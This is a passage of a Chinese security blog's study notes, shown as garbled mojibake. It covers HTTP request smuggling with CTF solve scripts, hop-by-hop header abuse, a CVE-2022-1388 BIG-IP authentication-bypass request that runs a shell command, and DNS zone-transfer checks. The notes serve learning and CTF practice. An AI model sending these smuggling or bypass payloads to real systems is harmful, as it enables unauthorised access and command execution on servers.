çš„åœ°å€ï¼Œä¾‹å¦‚å‘é€ä»¥ä¸‹è¯·æ±‚ï¼š\nGET /home HTTP/1.1 Host: normal-website.com æˆ‘ä»¬ä¼šå¾—åˆ° Response :\nHTTP/1.1 301 Moved Permanently Location: https://normal-website.com/home/ çœ‹èµ·æ¥æ²¡ä»€ä¹ˆå±å®³ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬é…åˆ HTTP Smuggling å°±ä¼šæœ‰é—®é¢˜äº†ï¼Œä¾‹å¦‚ï¼š\nPOST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 54 Transfer-Encoding: chunked 0 GET /home HTTP/1.1 Host: attacker-website.com Foo: X Smugle ä¹‹åçš„è¯·æ±‚ä¼šåƒä»¥ä¸‹è¿™æ ·ï¼š\nGET /home HTTP/1.1 Host: attacker-website.com Foo: XGET /scripts/include.js HTTP/1.1 Host: vulnerable-website.com ç„¶åå¦‚æœæœåŠ¡å™¨æ ¹æ® Host è¿›è¡Œè·³è½¬çš„è¯ï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä»¥ä¸‹çš„ Response:\nHTTP/1.1 301 Moved Permanently Location: https://attacker-website.com/home/ è¿™æ ·ï¼Œå—å®³è€…ï¼Œä¹Ÿå°±æ˜¯è®¿é—®/scripts/include.jsè¿™ä¸ªçš„ç”¨æˆ·ï¼Œä¼šè¢«è·³è½¬åˆ°æˆ‘ä»¬æ§åˆ¶çš„ url\nç¼“å­˜æŠ•æ¯’ https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning\nåŸºäºä¸Šé¢çš„Hostè·³è½¬çš„æ”»å‡»åœºæ™¯ï¼Œå½“å‰ç«¯æœåŠ¡å™¨è¿˜å­˜åœ¨ç¼“å­˜é™æ€èµ„æºæ—¶å¯ä»¥é…åˆsmugglingè¿›è¡Œç¼“å­˜æŠ•æ¯’\nåœ¨/post/next?postId=2çš„è·¯ç”±å¤„æœ‰ä¸€ä¸ªè·³è½¬çš„apiä¾›æˆ‘ä»¬ä½¿ç”¨ï¼Œè¿™ä¸ªè·¯ç”±è·³è½¬åˆ°/post?postId=4\næˆ‘ä»¬é€‰æ‹©/resources/js/tracking.jsè¿›è¡ŒæŠ•æ¯’\nPOST / HTTP/1.1 Host: ac7a1f141fadd93d801c469f005500bf.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=f6c7ZBB52a6iedorGSywc8jM6USu4685 Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Type: application/x-www-form-urlencoded Content-Length: 178 Transfer-Encoding: chunked 0 GET /post/next?postId=3 HTTP/1.1 Host: ac701fe61fabd97b8027465701f800a8.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 10 x=1 ä¹‹åå†è®¿é—®/resources/js/tracking.jsä¼šè·³è½¬åˆ°æˆ‘ä»¬èµ°ç§è¯·æ±‚çš„url/post?postId=4ï¼Œå†è®¿é—®æ­£å¸¸ä¸»é¡µå°±ä¼šalert\nåœ¨Cè¯·æ±‚çš„/resources/js/tracking.jsä¼šè¢«å‰ç«¯æœåŠ¡å™¨è®¤ä¸ºæ˜¯é™æ€èµ„æºç¼“å­˜èµ·æ¥ï¼Œè€Œæˆ‘ä»¬åˆ©ç”¨HTTP Smugglingå°†è¿™ä¸ªè¯·æ±‚å¯¼å‘äº†æˆ‘ä»¬çš„vpsï¼Œè¿”å›äº†alert(1)ç»™Cè¯·æ±‚ï¼Œç„¶åè¿™ä¸ªå“åº”åŒ…å°±ä¼šè¢«å‰ç«¯æœåŠ¡å™¨ç¼“å­˜èµ·æ¥ï¼Œè¿™æ ·æˆ‘ä»¬å°±æˆåŠŸè¿›è¡Œäº†æŠ•æ¯’\nç¼“å­˜æ¬ºéª— åœ¨ç¼“å­˜æŠ•æ¯’ä¸­ï¼Œæ”»å‡»è€…å°†æ¶æ„å†…å®¹å­˜å‚¨åœ¨ç¼“å­˜ä¸­ å¹¶å°†è¯¥å†…å®¹ä»ç¼“å­˜ä¸­æä¾›ç»™å…¶å®ƒåº”ç”¨ç¨‹åºç”¨æˆ·ï¼Œè€Œåœ¨ç¼“å­˜æ¬ºéª—ä¸­ï¼Œæ”»å‡»è€…ä½¿åº”ç”¨ç¨‹åºå°†ä¸€äº›å±äºå¦ä¸€ä¸ªç”¨æˆ·çš„æ•æ„Ÿå†…å®¹å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œç„¶åæ”»å‡»è€…ä»ç¼“å­˜ä¸­æ£€ç´¢è¯¥å†…å®¹\næˆ‘ä»¬å‘é€è¿™æ ·çš„è¯·æ±‚\nPOST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 43 Transfer-Encoding: chunked 0 GET /private/messages HTTP/1.1 Foo: X smuggleçš„è¯·æ±‚ä¼šç”¨Foo:Xè¦†ç›–ä¸‹ä¸€ä¸ªå‘è¿‡æ¥çš„è¯·æ±‚å¤´çš„ç¬¬ä¸€è¡Œï¼ˆGET /xxx HTTP/1.1ï¼‰ å¹¶ä¸”è¿™ä¸ªè¯·æ±‚ä¼šå¸¦ç€ç”¨æˆ·çš„cookieå»è®¿é—®ï¼Œç±»ä¼¼CSRFï¼Œè¯¥è¯·æ±‚å°±ä¼šå˜æˆè¿™æ ·\nGET /private/messages HTTP/1.1 Foo: XGET /static/some-image.png HTTP/1.1 Host: vulnerable-website.com Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z å¤šå‘é€å‡ æ¬¡ï¼Œä¸€æ—¦ç”¨æˆ·è®¿é—®çš„æ˜¯é™æ€èµ„æºï¼Œå°±å¯èƒ½ä¼šè¢«å‰ç«¯æœåŠ¡å™¨ç¼“å­˜èµ·æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ°ç”¨æˆ·/private/messagesçš„ä¿¡æ¯äº†\nin CTF [BuckeyeCTF 2021]Curly fries file-link\nç”¨cçš„curl.håº“å®ç°curlçš„åŠŸèƒ½ï¼Œæ¥æ”¶ä¸€ä¸ªæˆ‘ä»¬è¾“å…¥çš„urlï¼Œcurlä¹‹åè¿”å›å“åº”åŒ…çš„å†…å®¹ï¼Œçœ‹ä¸‹cæºç \n#include \u0026lt;curl/curl.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int verify_flag_file() { // Verify that the flag file still contains the flag char* buf = malloc(1024); FILE* fp = fopen(\u0026#34;./flag.txt\u0026#34;, \u0026#34;r\u0026#34;); fgets(buf, 1024, fp); int res = strstr(buf, \u0026#34;Congratulations! Here\u0026#39;s the flag: buckeye{\u0026#34;) == buf; free(buf); return res; } char* response = NULL; size_t response_buf_size = 0; size_t response_size = 0; size_t header_callback(char* data, size_t size, size_t nitems, void* userdata) { size_t real_size = size * nitems; printf(\u0026#34;\u0026lt; %.*s\u0026#34;, (int)real_size, data); if (strstr(data, \u0026#34;Content-Length\u0026#34;) == data || strstr(data, \u0026#34;content-length\u0026#34;) == data) { // æ£€æŸ¥CLå¤´ å¹¶ä¸ä¸¥è°¨ __attribute__((unused)) char* name = strtok(data, \u0026#34; \u0026#34;); size_t content_length = atol(strtok(NULL, \u0026#34; \u0026#34;)); // æ³¨æ„ ä¾æ®CLå€¼åˆ†é…ç¼“å†²åŒºçš„å¤§å° if (response) { // å¦‚æœæœ‰å…ˆé‡Šæ”¾ free(response); } response_buf_size = content_length + 1; response = (char*)malloc(response_buf_size); // åˆ†é…å“åº”ç¼“å†²åŒºå¤§å°ä¸ºCL+1 } return real_size; } size_t write_callback(void* data, size_t size, size_t nitems, void* userdata) { size_t real_size = size * nitems; if (response_size + real_size \u0026gt; response_buf_size - 1) { response_buf_size = response_size + real_size + 1; response = (char*)realloc(response, response_buf_size); } memcpy(response + response_size, data, real_size); response_size += real_size; return real_size; } int main() { setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL); char url[64]; printf(\u0026#34;Enter a URL and I\u0026#39;ll curl it: \u0026#34;); fgets(url, 64, stdin); url[strcspn(url, \u0026#34;\\n\u0026#34;)] = 0; if (!verify_flag_file()) { fprintf(stderr, \u0026#34;ERROR! flag.txt may have been tampered with!\\n\u0026#34;); return 3; } CURL* curl = curl_easy_init(); if (curl) { curl_easy_setopt(curl, CURLOPT_URL, url); curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L); curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, header_callback); curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback); curl_easy_setopt(curl, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); CURLcode res = curl_easy_perform(curl); if (res == CURLE_OK) { if (response) { response[response_buf_size] = 0; puts(response); free(response); } } else { fprintf( stderr, \u0026#34;curl_easy_perform() failed: %s\\n\u0026#34;, curl_easy_strerror(res)); } curl_easy_cleanup(curl); } return 0; } æ³¨æ„header_callbackæ£€æŸ¥CLå¤´çš„æ—¶å€™ç”¨strstrå‡½æ•°ï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥ç”¨Content-Lengthw: 1023è¿™æ ·çš„å¤´æ¥ç»™responseåˆ†é…1023+1=1024çš„ç©ºé—´\nç†è®ºä¸Šæ¥è¯´ï¼Œmallocåº”è¯¥åœ¨verify_flag_fileçš„åœ°æ–¹åŠæ—¶åœ°é‡Šæ”¾æ‰å«æœ‰flagçš„éƒ¨åˆ†å¹¶ä¸”æ­£ç¡®ç»™å‡ºresponseï¼Œä½†æ˜¯æ ¹æ®doc - the curl docs for the write callbackï¼Œä¼ å…¥çš„æ•°æ®å¹¶æ²¡æœ‰ç©ºå­—ç¬¦ä½œä¸ºç»ˆæ­¢ç¬¦ï¼Œè€Œé¢˜ç›®puts(response)çš„å†…å®¹ä¼šåˆ°response_bufçš„æœ«å°¾ï¼Œä¹Ÿå°±æ˜¯1024å¤§å°\næœ€åï¼Œresponseä¸­å‰16å­—èŠ‚æ˜¯ç©ºå­—èŠ‚ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å‘é€16å­—ç¬¦è®©å®ƒä»¬å˜ä¸ºéç©º\nimport socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((\u0026#39;0.0.0.0\u0026#39;, 6969)) s.listen() conn, addr = s.accept() print(\u0026#39;Accepted connection.\u0026#39;) with conn: data = b\u0026#39;\u0026#39; while not data.endswith(b\u0026#39;\\r\\n\\r\\n\u0026#39;): data += conn.recv(1) print(data) conn.sendall( b\u0026#39;HTTP/1.1 200 OK\\r\\n\u0026#39; b\u0026#39;Content-Lengthw: 1023\\r\\n\u0026#39; b\u0026#39;\\r\\n\u0026#39; + b\u0026#39;a\u0026#39;*16 ) s.close() ä¸¥æ ¼æ¥è¯´è¿™å¹¶ä¸æ˜¯smugglingçš„é—®é¢˜ï¼Œæœ€å¤šæ˜¯æ¶‰åŠåˆ°TE\nThere was a use after free on the buffer the flag was stored in. If you could get the binary to re-allocate another 1024-length buffer and not fill it in, it will contain the flag that was originally read into the \u0026ldquo;flag validity checking\u0026rdquo; buffer.\nè™½ç„¶è¿˜æ˜¯æœ‰ä¸€ç‚¹ç‚¹ä¸å¤ªæ‡‚\n[BuckeyeCTF 2021]sozu è¿™ä¸‹æ˜¯æ­£ç»çš„smugglingé—®é¢˜äº†\nfrom pwn import * import ssl hostname = \u0026#39;sozu.chall.pwnoh.io\u0026#39; ctx = ssl.create_default_context() #ctx.check_hostname = False #ctx.verify_mode = ssl.CERT_NONE sock = socket.create_connection((hostname, 13380)) ssock = ctx.wrap_socket(sock, server_hostname=hostname) r = remote(hostname, \u0026#34;13380\u0026#34;, sock=ssock) # The solution here is the tab after \u0026#39;chunked\u0026#39;. # sozu will use content-length, gunicorn will use # chunked. # You do actually need another request after getting # the flag, otherwise you won\u0026#39;t get the response back #r = remote(\u0026#34;localhost\u0026#34;, \u0026#34;3000\u0026#34;) r.send(\u0026#34;\u0026#34;\u0026#34;POST /public/testing HTTP/1.1\\r Host: sozu.chall.pwnoh.io\\r Connection: keep-alive\\r transfer-encoding: chunked\\t\\r content-length: 60\\r \\r 2\\r hi\\r 0\\r \\r GET /internal/flag HTTP/1.1\\r Host: localhost\\r \\r GET /public/test HTTP/1.1\\r Host: sozu.chall.pwnoh.io\\r \\r \u0026#34;\u0026#34;\u0026#34;) r.interactive() ä¸çŸ¥åé¢˜ https://hg8.sh/posts/misc-ctf/request-smuggling/\næ­£å¸¸çš„å“åº”åŒ…æç¤ºServer: gunicorn/19.9.0ï¼Œå½“è®¿é—®/resultsæ—¶ æœ‰ä¸€ä¸ªHAProxy Authenticationï¼Œæ‰€ä»¥webéƒ¨åˆ†åº”è¯¥æ˜¯è¿™æ ·çš„æ¶æ„\nUser | | +-----+-----+ | | | HAProxy | | | +-----+-----+ | | +---------+----------+ +-------------+ | | | | | Gunicorn | | Web App | | WSGI HTTP Server +-----+ Python (?) | | | | | +--------------------+ +-------------+ å‰ç«¯çš„æœåŠ¡å™¨æ˜¯HAProxyï¼Œåç«¯çš„æ˜¯gunicornï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•smugglingï¼Œå¤¹å¸¦ä¸€ä¸ª/resultsçš„è¯·æ±‚ï¼Œè®©å®ƒä¸è¢«å‰ç«¯æœåŠ¡å™¨HAProxyè§£æ ç›´æ¥è½¬å‘ç»™åç«¯çš„gunicorn\nå°è¯•è¿™æ ·çš„è¯·æ±‚\nPOST / HTTP/1.1 Host: misc.ctf:33433 Content-Length: 6 Transfer-Encoding: chunked 0 X æ­£å¸¸æƒ…å†µä¸‹å‰ç«¯çš„HAProxyä¼šè¿™æ ·è½¬å‘ç»™åç«¯çš„gunicorn\nPOST / HTTP/1.1 Host: misc.ctf:33433 Transfer-Encoding: chunked X-Forwarded-For: 172.21.0.1 0 å¯ä»¥æ³¨æ„åˆ°æœ«å°¾çš„Xå› ä¸ºCLçš„åŸå› è€Œè¢«ä¸¢æ‰ å¹¶ä¸”å¿½ç•¥äº†TEï¼Œæˆ‘ä»¬smugglingæ˜¯éœ€è¦TEçš„ï¼Œå°è¯•è¿™æ ·ä¿®æ”¹\nPOST / HTTP/1.1 Host: misc.ctf:33433 Content-Length: 13 Transfer-Encoding:[\\x0b]chunked 0 SMUGGLED è½¬å‘åæ˜¯è¿™æ ·\nPOST / HTTP/1.1 Host: misc.ctf:33433 Content-Length: 13 Transfer-Encoding: chunked X-Forwarded-For: 172.21.0.1 0 SMUGGLED æˆåŠŸèµ°ç§äº†å†…å®¹\nç›´æ¥æ”¾æœ€åçš„payload\nPOST / HTTP/1.1 Host: misc.ctf:33433 Content-Length: 39 Content-Type: application/x-www-form-urlencoded Transfer-Encoding:ï¿½chunked 1 A 0 GET /results HTTP/1.1 Foo: xGET / HTTP/1.1 $ printf \u0026#34;POST / HTTP/1.1\\r\\nHost: misc.ctf:33433\\r\\nContent-Length: 39\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nTransfer-Encoding:^Lchunked\\r\\n\\r\\n1\\r\\nA\\r\\n0\\r\\n\\r\\nGET /results HTTP/1.1\\r\\nFoo: xGET / HTTP/1.1\\r\\n\\r\\n\u0026#34; | nc misc.ctf:33433 HTTP/1.1 400 BAD REQUEST Server: gunicorn/19.9.0 Date: Thu, 04 Jun 2020 17:41:32 GMT Content-Type: text/html; charset=utf-8 Content-Length: 192 \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 3.2 Final//EN\u0026#34;\u0026gt; \u0026lt;title\u0026gt;400 Bad Request\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Bad Request\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The browser (or proxy) sent a request that this server could not understand.\u0026lt;/p\u0026gt; HTTP/1.1 200 OK Server: gunicorn/19.9.0 Date: Thu, 04 Jun 2020 17:41:32 GMT Content-Type: text/html; charset=utf-8 Content-Length: 30 flag{r3KW35t 5mu99L1N9 12 8Ad} ä¿®å¤ ä½¿ç”¨HTTP/2 åŠ å…¥äº†Request multiplexing over a single TCP connectionï¼Œå‡å°‘TCPè¿æ¥å¤ç”¨çš„å¯èƒ½æ€§\nå‰åç«¯æœåŠ¡å™¨ä¸€è‡´ ç¦ç”¨ä»£ç†æœåŠ¡å™¨ä¸åç«¯æœåŠ¡å™¨ä¹‹é—´çš„TCPè¿æ¥å¤ç”¨ hop-by-hop headers abuse æ ¹æ®RFC 2612ï¼Œä¸ºäº†åŒºåˆ†è¯·æ±‚ä¸­ä»£ç†æ˜¯å¦å­˜cacheçš„è¡Œä¸ºï¼ŒæŠŠè¯·æ±‚å¤´åŒºåˆ†ä¸ºä»¥ä¸‹ä¸¤ç§\nend-to-end å¿…é¡»è´¯ç©¿è¯·æ±‚å§‹ç»ˆ\nhop-by-hop å½“è¯·æ±‚ä¸­é‡åˆ°è¿™äº›è¯·æ±‚å¤´ï¼Œä¸€ä¸ªæ­£å¸¸çš„proxyä¸ä¼šæŠŠè¿™äº›ä¿¡æ¯å¸¦åˆ°ä¸‹ä¸€ä¸ªhopå†…ï¼›é»˜è®¤hop-by-hopæœ‰è¿™äº›\nConnection Keep-Alive Proxy-Authenticate Proxy-Authorization TE Trailers Transfer-Encoding Upgrade é™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥è‡ªå®šä¹‰è¯·æ±‚å¤´åŠ å…¥hop-by-hopçš„è¡Œåˆ—ä¸­ï¼Œåªéœ€æŠŠå®ƒæ”¾å…¥Connectionå­—æ®µä¸­å³å¯\nConnection: close, X-Foo, X-Bar ç”±æ­¤å¯¼è‡´çš„hop-by-hopå¤´æ»¥ç”¨å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›é€»è¾‘é”™è¯¯\nå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæ­£å¸¸proxyå¤„ç†ä¼šåœ¨åŸå§‹è¯·æ±‚çš„ä¸‹ä¸€è·³ï¼ˆè½¬ç§»åˆ°ä»£ç†ï¼‰ä¸­ç§»é™¤hop-by-hopåˆ—è¡¨ä¸­çš„å¤´ï¼Œåˆ©ç”¨è¿™ç§ç‰¹æ€§ï¼Œåœ¨Connectionä¸­è¢«æ·»åŠ çš„å¤´ä¼šè¢«ç§»é™¤ï¼Œæœ‰è¿™æ ·å‡ ç§åˆ©ç”¨æ€è·¯ï¼šåˆ é™¤XFFå¤´éšè—IPã€ç¼“å­˜ä¸­æ¯’DoSã€SSRFã€ç»•è¿‡WAF\nç”±åˆ headerå¯¼è‡´çš„æƒé™æå‡æ¼æ´æœ‰CVE-2021-32813ï¼Œä¿®å¤æ–¹æ¡ˆå°±æ˜¯BIG-IPåŒæ¬¾çš„setï¼Œè¿˜æœ‰æ —å­å’Œæ —å­2\nCVE-2022-1388 å°†é‰´æƒç”¨çš„X-F5-Auth-Tokenå¤´æ”¾å…¥Connectionä¸­è®©å…¶åœ¨è¢«è½¬å‘è‡³åç«¯æœåŠ¡å™¨æ—¶è¢«åˆ æ‰ï¼Œä»è€Œç»•è¿‡é‰´æƒ\nPOST /mgmt/tm/util/bash Authorization: Basic YWRtaW46 X-F5-Auth-Token: a Connection: Keep-alive, X-F5-Auth-Token { \u0026#34;command\u0026#34;:\u0026#34;run\u0026#34;, \u0026#34;utilCmdArgs\u0026#34;:\u0026#34;-c id\u0026#34; } æ›´å¤šjavaä»£ç å±‚çš„åˆ†æè¯¦è§å¤©æ²³å¸ˆå‚…çš„è¿™ç¯‡\né¦–å…ˆæ˜¯å½“X-F5-Auth-Tokenä¸ºç©ºæ—¶èµ°å…¥å¦ä¸€æ¡éªŒè¯æµç¨‹ï¼Œè€Œè¿™ä¸ªæµç¨‹ä¾èµ–äºæˆ‘ä»¬ç»™headeræä¾›çš„Authorization:å­—æ®µã€‚å› ä¸ºAuthorizationå­—æ®µå¯æ§ï¼Œå¹¶ä¸”æ²¡æœ‰å¤æ‚çš„åŠ å¯†å¤„ç†ï¼Œä»è€Œå¯¼è‡´å¯ä»¥è½»æ˜“ç»•è¿‡é‰´æƒã€‚\nä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ HTTPè¯·æ±‚åˆ‡åˆ†å‡ºå¤„paper\nburpè¯¦è§£\nä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ HTTP Smuggling æ”»å‡»\ncve-2018-8004\nä¸çŸ¥åé¢˜\nBIG-IP(CVE-2022-1388)ä»ä¿®å¤æ–¹æ¡ˆåˆ†æå‡ºexp\nCVE-2022-1388æ¼æ´åˆ†æ\nAbusing HTTP hop-by-hop request headers\n","date":"2022-05-21T23:09:24+08:00","permalink":"https://amiaaaz.github.io/2022/05/21/hrs-and-hop-by-hop-request-header-abuse-study-notes/","section":"posts","tags":[],"title":"HTTPè¯·æ±‚èµ°ç§æ”»å‡»\u0026Hop-By-Hopè¯·æ±‚å¤´åˆ©ç”¨å­¦ä¹ ç¬”è®°"},{"categories":["NOTES\u0026SUMMARY"],"contents":"DNSæœåŠ¡å™¨æä¾›åŸŸåè§£æçš„åŸºç¡€æ€§æœåŠ¡ï¼Œå¯ä»¥ç»†åˆ†ä¸ºä¸»æœåŠ¡å™¨ã€å¤‡ä»½æœåŠ¡å™¨ã€ç¼“å­˜æœåŠ¡å™¨ï¼Œå¤‡ä»½æœåŠ¡å™¨ä¼šä»ä¸»æœåŠ¡å™¨ä¸­æ‹·è´æ•°æ®æ¥æ›´æ–°è‡ªå·±çš„æ•°æ®åº“ï¼Œè€Œè¿™ä¸ªåŒæ­¥çš„è¿‡ç¨‹ä¸­å°±éœ€è¦ç”¨åˆ°DNSåŸŸä¼ é€ï¼Œä¸€æ—¦é…ç½®ä¸å½“ï¼Œå°±å¯èƒ½ä¼šå¯¼è‡´ä»»ä½•åŒ¿åç”¨æˆ·éƒ½å¯ä»¥è·å–DNSæœåŠ¡å™¨æŸä¸€åŸŸçš„æ‰€æœ‰è®°å½•ï¼Œæ³„éœ²é‡è¦ä¿¡æ¯\næ¼æ´æˆå›  åœ¨åŸŸä¼ é€ä¸­å…³é”®çš„é…ç½®é¡¹æœ‰è¿™ä¸¤ä¸ª\nallow-transfer {ipaddress;}; é€šè¿‡ipé™åˆ¶å¯è¿›è¡ŒåŸŸä¼ é€çš„æœåŠ¡å™¨ allow-transfer { key transfer; }; é€šè¿‡keyé™åˆ¶å¯è¿›è¡ŒåŸŸä¼ é€çš„æœåŠ¡å™¨ æœ‰ä¸¤ç§è®¾ç½®æ–¹å¼ï¼Œoptionsæˆ–æ˜¯zoneï¼Œé»˜è®¤ä¼˜å…ˆçº§ä¸ºzone å¦‚æœä¸ºç©ºåˆ™éµå¾ªoptionsï¼Œç¤ºä¾‹\noptions { listen-on { 1.1.1.1; }; listen-on-v6 { any; }; directory \u0026#34;/bind\u0026#34;; pid-file \u0026#34;/bind/run/pid\u0026#34;; dump-file \u0026#34;/bind/data/named_dump.db\u0026#34;; statistics-file \u0026#34;/bind/data/named.stats\u0026#34;; allow-transfer { any; }; allow-query {any;}; }; zone \u0026#34;wooyun.org\u0026#34; { type master; file \u0026#34;/bind/etc/wooyun.org.conf\u0026#34;; allow-transfer {any;}; }; å¦‚æœæ²¡æœ‰æ‰‹åŠ¨æ·»åŠ allow-transferæ¥é™åˆ¶è·å–è®°å½•çš„æ¥æºï¼Œå°±ä¼šå­˜åœ¨DNSåŸŸä¼ é€æ¼æ´\næ£€æµ‹æ–¹å¼ dig / linux ä»¥vulhubä¸ºä¾‹ï¼Œä»¥å¸¸è§„çš„8.8.8.8ä½œä¸ºDNSæœåŠ¡å™¨è¿›è¡Œè§£æï¼Œå¦‚æœå‘é€axfrçš„è¯·æ±‚ä¼šfailed\nå¦‚æœä½¿ç”¨å­˜åœ¨æ¼æ´çš„DNSæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ï¼Œåˆ™ä¼šè¿”å›åŸŸå†…æ‰€æœ‰çš„å­—åŸŸã€Aè®°å½•å’ŒCNAMEç­‰ä¿¡æ¯\nnslookup / windows\u0026amp;linux æ­£å¸¸æƒ…å†µï¼š\nå­˜åœ¨æ¼æ´çš„æƒ…å†µï¼ˆlinuxç¤ºä¾‹ï¼‰ï¼š\nNmap nmap -script dns-zone-transfer -script-args dns-zone-transfer.domain=vulhub.org -p 53 -Pn 172.27.0.2 dnsrecon dnsrecon -d example.com dnsenum dnsenum example.com ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ æµ…æDNSåŸŸä¼ é€æ¼æ´\nDNSåŸŸä¼ é€ä¿¡æ¯æ³„éœ²\nvulhubå¤ç°ç¯å¢ƒ\n","date":"2022-05-06T16:52:58+08:00","permalink":"https://amiaaaz.github.io/2022/05/06/dns-zone-transfer-study-note/","section":"posts","tags":["PENTEST"],"title":"DNSåŸŸä¼ é€æ¼æ´å­¦ä¹ "},{"categories":["NOTES\u0026SUMMARY"],"contents":"å­¦çš„æ—¶å€™éšæ‰‹è®°å½•çš„ï¼Œå¯èƒ½æœ‰å¾ˆå¤šé”™è¯¯ï¼Œè§è°…ï¼ˆ\nå‚è€ƒé“¾æ¥ç»Ÿä¸€åœ¨æ–‡æœ«\nåŸºæœ¬å®šä¹‰ prototype\u0026amp;__proto__ jsä¸­å®šä¹‰ç±»éœ€è¦é€šè¿‡å®šä¹‰æ„é€ å‡½æ•°çš„æ–¹å¼è¿›è¡Œ\nfunction Foo() { this.bar = 1 } new Foo() Fooå‡½æ•°çš„å†…å®¹å°±æ˜¯Fooç±»çš„æ„é€ å‡½æ•°ï¼Œè€Œthis.baræ˜¯Fooç±»çš„ä¸€ä¸ªå±æ€§ï¼›é™¤äº†å®šä¹‰äº†å€¼çš„æ™®é€šå±æ€§æˆ‘ä»¬è¿˜å¯ä»¥å°†æ–¹æ³•å®šä¹‰åˆ°æ„é€ å‡½æ•°å†…éƒ¨\nfunction Foo() { this.bar = 1 this.show = function(){ console.log(this.bar) } } (new Foo()).show() å¯æ˜¯è¿™æ ·çš„å†™æ³•ä¼šé€ æˆä¸€ä¸ªé—®é¢˜ï¼Œå³æ¯å½“æˆ‘ä»¬æ–°å»ºä¸€ä¸ªFooå¯¹è±¡æ—¶ï¼Œthis.show = function()è¿™æ ·çš„ä»£ç å°±ä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œshowæ–¹æ³•è¢«ç»‘å®šåœ¨å¯¹è±¡ä¸Šè€Œä¸æ˜¯ç±»ä¸­ï¼›æˆ‘ä»¬å¸Œæœ›åˆ›å»ºç±»æ—¶åªåˆ›å»ºä¸€æ¬¡showæ–¹æ³•ï¼Œè¿™æ—¶å€™éœ€è¦ä½¿ç”¨åŸå‹prototype\nfunction Foo() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let foo = new Foo() foo.show() prototypeæ˜¯ç±»Fooçš„ä¸€ä¸ªå±æ€§ï¼Œè€Œæ‰€æœ‰ç”¨Fooç±»å®ä¾‹åŒ–çš„å¯¹è±¡éƒ½å°†æ‹¥æœ‰è¿™ä¸ªå±æ€§ä¸­çš„å…¨éƒ¨å†…å®¹ï¼ˆåŒ…æ‹¬å˜é‡å’Œæ–¹æ³•ï¼‰ï¼Œæ¯”å¦‚ä¸Šè¿°ä»£ç ä¸­çš„fooå¯¹è±¡å¯ä»¥ç›´æ¥è°ƒç”¨showæ–¹æ³•/å‡½æ•°\næˆ‘ä»¬æ˜¯é€šè¿‡Foo.prototypeæ¥è®¿é—®Fooç±»çš„åŸå‹ï¼Œä½†ç»è¿‡Fooå®ä¾‹åŒ–çš„å¯¹è±¡æ˜¯ä¸èƒ½é€šè¿‡.prototypeæ¥è®¿é—®åŸå‹çš„ï¼Œè€Œæ˜¯å€ŸåŠ©__proto__\nç»ç”±ç±»å®ä¾‹åŒ–è€Œæ¥çš„å¯¹è±¡å¯ä»¥é€šè¿‡.__proto__æ¥è®¿é—®å¯¹åº”ç±»çš„åŸå‹ï¼Œå³\nfoo.__proto__ == Foo.prototype æ‰€ä»¥æ€»ç»“ä¸¤ç‚¹\nç±»è‡ªå¸¦prototypeå±æ€§ï¼Œç»ç”±ç±»å®ä¾‹åŒ–æ¥çš„å¯¹è±¡ä¼šè‡ªåŠ¨å¸¦ä¸Šprototypeä¸­çš„å±æ€§å’Œæ–¹æ³• ç»ç”±ç±»å®ä¾‹åŒ–è€Œæ¥çš„å¯¹è±¡å¯ä»¥é€šè¿‡.__proto__æ¥è®¿é—®å¯¹åº”ç±»çš„åŸå‹ ç»ç”±ç±»å®ä¾‹åŒ–è€Œæ¥çš„å¯¹è±¡å¯ä»¥é€šè¿‡.constructoræ¥è·å–æ„é€ è¿™ä¸ªå®ä¾‹çš„æœ¬æ¥çš„å‡½æ•° constructor function Dog(name) { this.name = name } 